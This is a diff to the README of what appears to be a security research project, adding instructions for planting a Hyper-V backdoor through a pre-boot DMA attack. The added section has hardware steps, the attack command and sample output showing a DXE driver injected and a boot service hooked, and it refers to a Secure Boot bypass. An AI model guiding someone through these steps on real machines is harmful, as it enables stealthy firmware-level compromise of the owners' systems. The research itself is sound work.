@@ -62,6 +62,58 @@ Backdoor supports 64-bit versions of Windows 10 1709, 1803, 1809, 1903, 1909, 20
 * `grub-2.02_chainloader.patch` &minus; GRUB2 patch used to compile malicious chain-loader module needed for Secure Boot bypass with the help of the signed Kaspersky bootloader.
 
 
+## Deploying the Backdoor Using Pre-Boot DMA Attack
+
+Python program `uefi_backdoor_hv.py` injects UEFI DXE driver of Hyper-V backdoor located in `payloads/DmaBackdoorHv` folder into the target system boot sequence using pre-boot DMA attack described in "Practical DMA Attacks" part of the [DMA attack toolkit docummentation](https://github.com/Cr4sh/s6_pcie_microblaze#practical-dma-attacks). To use this program you have to perform the following steps:
+
+1) Power off the target computer.
+
+2) Connect SP605 board to the PCI-E (or Mini PCI-E, or M.2) port of the target computer.
+
+3) Turn the borad on and ensure that Microblaze firmware was successfully initialized by pinging an IP address that was specified during the board configuration with `bootloader_ctl.py` program. 
+
+4) Run the following command to start pre-boot DMA attack: 
+
+```
+$ ./uefi_backdoor_hv.py --driver payloads/DmaBackdoorHv/DmaBackdoorHv_X64.efi
+```
+
+5) Power on the target computer, in case of successful attack after the couple of seconds you will see red debug messages screen of injected UEFI DXE driver.
+
+An example of `uefi_backdoor_hv.py` console output after the successful attack:
+
+```
+$ ./uefi_backdoor_hv.py --driver payloads/DmaBackdoorHv/DmaBackdoorHv_X64.efi
+[+] Using UEFI system table hook injection method
+[+] Reading DXE phase payload from payloads/DmaBackdoorHv/DmaBackdoorHv_X64.efi
+[+] Waiting for PCI-E link...
+[!] PCI-E endpoint is not configured by root complex yet
+[!] PCI-E endpoint is not configured by root complex yet
+[!] PCI-E endpoint is not configured by root complex yet
+[!] Bad MRd TLP completion received
+[+] PCI-E link with target is up
+[+] Looking for DXE driver PE image...
+[+] PE image is at 0x77160000
+[+] EFI_SYSTEM_TABLE is at 0x7a03e018
+[+] EFI_BOOT_SERVICES is at 0x7a38fa30
+[+] EFI_BOOT_SERVICES.LocateProtocol() address is 0x7a3987b4
+Backdoor image size is 0x2c20
+Backdoor entry RVA is 0xbd4
+Planting DXE stage driver at 0xc0000...
+Hooking LocateProtocol(): 0x7a3987b4 -> 0x000c0bd4
+3.611646 sec.
+[+] DXE driver was planted, waiting for backdoor init...
+[+] DXE driver was executed, you can read its debug messages by running this program with --debug-output option
+[+] Waiting for Hyper-V load...
+[+] Hyper-V image was loaded
+
+    Hyper-V image base: 0xfffff8072d690000
+           Image entry: 0xfffff8072d901360
+       VM exit handler: 0xfffff8072d8add90
+
+[+] DONE
+```
+
 ## Deploying the Backdoor Using Signed Kaspersky bootloader
 
 [Windows Virtualization-based Security (VBS)](https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs) uses hardware virtualization features and Hyper-V to host a number of security solutions, providing them with greatly increased protection from vulnerabilities in the operating system, and preventing the use of malicious exploits which attempt to defeat protections. One of the examples of such services is [Hypervisor-Enforced Code Integrity](https://docs.microsoft.com/en-us/windows/security/threat-protection/device-guard/enable-virtualization-based-protection-of-code-integrity) which uses VBS to significantly strengthen code integrity policy enforcement.
@@ -87,6 +139,7 @@ To get more information about Virtualization-based Security and Virtual Secure M
 * [Live forensics on the Windows 10 secure kernel](https://www.semanticscholar.org/paper/Live-forensics-on-the-Windows-10-secure-kernel.-Brendmo/e275cc28c5c8e8e158c45e5e773d0fa3da01e118) by Hans Kristian Brendmo
 
 * [Work Package 6: Virtual Secure Mode](https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Cyber-Sicherheit/SiSyPHus/Workpackage6_Virtual_Secure_Mode.pdf?__blob=publicationFile&v=2) by [The BSI](https://www.bsi.bund.de/EN/TheBSI/thebsi_node.html)
+
 
 ## Troubleshooting
 
